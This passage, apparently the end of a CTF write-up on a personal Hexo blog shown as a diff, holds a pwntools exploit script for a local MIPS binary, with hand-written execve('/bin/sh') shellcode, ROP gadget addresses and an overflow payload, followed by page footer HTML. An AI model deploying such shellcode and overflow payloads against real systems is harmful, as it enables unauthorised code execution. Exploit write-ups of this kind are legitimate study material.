+context(arch=&quot;mips&quot;,log_level=&quot;debug&quot;)
+
+program = &quot;./mips&quot;
+p = process([&quot;qemu-mipsel-static&quot;, &quot;-g&quot;, &quot;2333&quot;, &quot;-L&quot;, &quot;./&quot;, program])
+gdb.attach(p,f&#39;&#39;&#39;
+    file &#123;program&#125;
+    target remote 127.0.0.1:2333
+    b main
+    c
+    &#39;&#39;&#39;)
+
+gadget1 = 0x00427968
+gadget2 = 0x0041FBF4
+shellcode = &quot;&quot;&quot;
+li $v0,0xfab            
+li $t0,0x0068732f
+li $t1,0x6e69622f
+addi $sp,$sp,-4
+sw $t0, 0($sp)
+addi $sp,$sp,-4
+sw $t1, 0($sp)
+or $a0,$sp,$zero
+or $a1,$zero,$zero
+or $a2,$zero,$zero
+syscall
+
+&quot;&quot;&quot;
+#shellcode = shellcraft.sh()
+payload = asm(shellcode).ljust(0x40,b&quot;A&quot;) + p32(gadget2) + p32(gadget1) + b&quot;A&quot;*0x58 + asm(shellcode)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Collectcrop&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;collectcrop
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
